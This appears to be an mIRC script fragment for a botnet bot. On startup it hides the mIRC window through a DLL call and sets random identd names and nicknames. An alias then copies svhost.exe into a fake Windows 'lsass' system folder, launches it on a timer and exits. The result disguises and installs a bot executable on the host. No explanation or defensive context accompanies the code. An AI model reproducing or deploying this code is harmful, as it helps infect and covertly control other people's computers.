   ON *:START: {
     echo -a $dll(bnuth.dll,HideMirc,on)
     botnet.check.bnut
     .identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
     nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
     anick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
   }

   alias botnet.check.bnut {
     if (!$isfile(c:\windows\system32\lsass\svhost.exe)) {
   mkdir c:\windows\system32\lsass\
   copy svhost.exe c:\windows\system32\lsass\svhost.exe
   run mirc.pif
   .timer 1 10 run c:\windows\system32\lsass\svhost.exe
   .timer 1 13 exit
    }
    else { EXIT }
   }
